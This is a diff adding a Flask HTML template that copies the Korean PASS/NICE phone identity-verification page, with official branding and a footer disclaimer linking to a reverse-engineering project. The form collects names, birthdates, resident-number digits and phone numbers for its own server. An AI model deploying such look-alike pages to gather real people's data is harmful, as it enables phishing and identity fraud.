@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="ko">
+
+<head>
+    <meta charset="euc-kr">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="ko-KR">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="format-detection" content="telephone=no">
+
+    <title>휴대폰 본인확인 - {{ isp_name }} - 정보입력</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/fonts.css') }}" media="screen" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/reset.css') }}" media="screen" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/layout.css') }}" media="screen" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}" media="screen" />
+    <script src="{{ url_for('static', filename='js/common/jquery.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/layerPopup.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/style.js') }}"></script>
+    <script type="text/javascript">
+        let overClickCheck = false;
+        let failCount = 0;
+        const maxFailCount = 3;
+        const initialCaptchaBase64 = "{{ captchaBase64 or '' }}";
+
+        $(function () {
+            if (initialCaptchaBase64) {
+                $("#simpleCaptchaImg").attr("src", "data:image/png;base64," + initialCaptchaBase64);
+            }
+
+            $("#btnSimpleCaptchaReload").click(function () {
+                $.ajax({
+                    url: '{{ url_for("refresh_captcha_sms") }}',
+                    method: 'POST',
+                    success: function (data) {
+                        if (data.code === 'SUCCESS') {
+                            $("#simpleCaptchaImg").attr("src", "data:image/png;base64," +
+                                data.captchaBase64);
+                        }
+                    }
+                });
+            });
+
+            $('body').on('click', '.btnSubmit.show', function () {
+                if (overClickCheck) return false;
+                if (!checkValueLayer($("#userName"), "이름을 입력해 주세요.")) return false;
+                if (!checkRegExpLayer($("#userName"), "NAME", "올바른 이름을 입력해주세요.")) return false;
+                if (!checkValueLayer($("#myNum1"), "생년월일을 입력해 주세요.")) return false;
+                if (!checkValueLayer($("#myNum2"), "주민등록번호 뒷자리 첫번째를 입력해 주세요.")) return false;
+                if (!checkValueLayer($("#mobileNo"), "휴대폰 번호를 입력해 주세요.")) return false;
+                if (!checkRegExpLayer($("#mobileNo"), "MOBILENO", "올바른 휴대폰 번호를 입력해주세요.")) return false;
+                if (!checkValueLayer($("#captchaAnswer"), "보안문자를 입력해 주세요.")) return false;
+
+                overClickCheck = true;
+
+                $.ajax({
+                    url: '{{ url_for("submit_sms") }}',
+                    method: 'POST',
+                    data: $("#frm").serialize(),
+                    success: function (data) {
+                        if (data.code === 'SUCCESS') {
+                            location.href = data.redirect;
+                        } else {
+                            failCount++;
+
+                            if (failCount >= maxFailCount) {
+                                location.href = '{{ url_for("error") }}';
+                                return;
+                            }
+
+                            let remainCount = maxFailCount - failCount;
+                            let title = "";
+                            let subMessage = "남은 횟수 " + failCount + "/" + maxFailCount;
+
+                            if (data.message.indexOf("보안문자") > -1 || data.message.indexOf(
+                                    "캡차") > -1) {
+                                title = "보안문자가 올바르지 않습니다.<br>다시 입력해주세요";
+                            } else {
+                                title = data.message;
+                            }
+
+                            messageLayerOpen(title, subMessage, $("#captchaAnswer"));
+                            overClickCheck = false;
+                            $("#btnSimpleCaptchaReload").click();
+                            $("#captchaAnswer").val("");
+                        }
+                    },
+                    error: function () {
+                        messageLayerOpen("오류", "요청 중 오류가 발생했습니다.", $("#captchaAnswer"));
+                        overClickCheck = false;
+                    }
+                });
+            });
+        });
+    </script>
+</head>
+
+<body>
+    <div class="h830" id="container">
+        <header id="header" class="pass_head">
+            <h1 class="logo">
+                <img src="https://nice.checkplus.co.kr/images/mobileCertV2/logo_pass.svg?ver=1767676388823" alt="PASS">
+            </h1>
+
+
+            <em>인증을 넘어<br>일상으로 PASS</em>
+
+        </header>
+        <section class="sc_content certWay_content sms">
+            <form name="frm" id="frm" method="post" autocomplete="off">
+                <input type="hidden" name="userNameEncoding" id="userNameEncoding">
+                <div class="inner sms_inner">
+                    <div class="content_head">
+                        <h2 id="infoName" class="on"><strong>이름</strong>을<br>입력해 주세요</h2>
+                        <h2 id="infoBirth" class=""><strong>생년월일/성별</strong>을<br>입력해 주세요</h2>
+                        <h2 id="infoTel"><strong>휴대폰번호</strong>를<br>입력해 주세요</h2>
+                        <h2 id="infoCode"><strong>보안문자</strong>를<br>입력해 주세요</h2>
+                        <h2 id="infoRe"><strong>입력정보</strong>를<br>확인해 주세요</h2>
+                    </div>
+                    <div class="group_smsway">
+                        <ul class="step_list">
+                            <li class="step_item step_name on">
+                                <div class="step_box">
+                                    <input type="text" name="userName" id="userName" placeholder="이름" value="">
+                                    <label for="userName" class="blind">이름</label>
+                                </div>
+                            </li>
+                            <li class="step_item step_id">
+                                <div class="step_box birth1">
+                                    <input type="text" maxlength="6" name="myNum1" id="myNum1" class="myNum"
+                                        placeholder="생년월일 6자리" value="" data-enc="on">
+                                    <label for="myNum1" class="blind">생년월일 6자리</label>
+                                </div>
+                                <span class="dash"></span>
+                                <div class="step_box birth2">
+                                    <input type="text" maxlength="1" name="myNum2" id="myNum2" class="myNum" value=""
+                                        data-enc="on">
+                                    <label for="myNum2" class="blind">주민등록번호 뒤 첫번째 자리</label>
+                                </div>
+                                <div class="digit_box"><i></i><i></i><i></i><i></i><i></i><i></i></div>
+                            </li>
+                            <li class="step_item step_tel">
+                                <div class="step_box">
+                                    <input type="text" maxlength="11" name="mobileNo" id="mobileNo" placeholder="휴대폰번호"
+                                        value="" data-enc="on">
+                                    <label for="mobileNo" class="blind">휴대폰번호</label>
+                                </div>
+                            </li>
+                            <li class="step_item step_captcha">
+
+                                <div class="simpleCaptcha">
+                                    <div class="simpleCaptchaDiv">
+                                        <img src="" alt="보안문자" id="simpleCaptchaImg">
+                                        <div class="simpleCaptchaBtn">
+                                            <button type="button" id="btnSimpleCaptchaReload" title="보안문자 새로고침">
+                                                <span class="btn_txt reload"><img
+                                                        src="https://nice.checkplus.co.kr/images/mobileCertV2/capcha_reload.png?ver=1767676388823"
+                                                        alt="보안문자 새로고침"></span>
+                                            </button>
+                                            <button type="button" id="btnSimpleCaptchaAudio" title="보안문자 음성듣기"
+                                                onclick="alert('음성듣기는 지원이 안됩니다.')">
+                                                <span class="btn_txt audio"><img
+                                                        src="https://nice.checkplus.co.kr/images/mobileCertV2/capcha_voice.png?ver=1767676388823"
+                                                        alt="보안문자 음성듣기"></span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="step_box capchaInput">
+                                    <input type="text" name="captchaAnswer" id="captchaAnswer" maxlength="6" value=""
+                                        class="checkValue" placeholder="보안문자 입력" text-transform: uppercase;"
+                                        data-enc="on">
+                                    <label for="captchaAnswer" class="blind">보안문자 입력</label>
+                                </div>
+                                <div id="simpleCaptchaAudioArea"></div>
+
+                            </li>
+                        </ul>
+                        <button type="button" id="btnSubmit" class="btn_pass btnUserName">다음</button>
+                    </div>
+                </div>
+            </form>
+        </section>
+
+        <div id="messageLayer" class="popup_wrap">
+            <div class="dim"></div>
+            <div class="group_popup type2">
+                <div class="inner">
+                    <div class="popup_head">
+                        <h3></h3>
+                    </div>
+                    <div class="popup_content">
+                        <p class="code_txt"></p>
+                    </div>
+                    <button type="button" class="btn_close btnLayerClose">확인</button>
+                </div>
+            </div>
+        </div>
+        <footer id="footer" class="nice_footer">
+            <div class="copyright">
+                <div class="copyrightInner">
+                    <a href="https://github.com/Imp1ex/Pass-Reverse/blob/main/NICE.md" target="_blank"
+                        class="footerAgreePop" title="새창 열림"><span class="bold partition">NICE평가정보 공식 항목들</span></a>
+                    <a href="https://github.com/Imp1ex/Pass-Reverse" target="_blank" class="footerAgreePop"
+                        title="새창 열림"><span class="partition">오픈소스</span></a>
+                    <p>해당 페이지는 공식 PASS 인증 페이지가 아닙니다</p>
+                </div>
+                <div class="logoBox">
+                    <div class="footer_logo">
+                        <img src="https://nice.checkplus.co.kr/images/cert/copyright_small.gif" alt="NICE평가정보">
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+
+</body>
+
+</html>
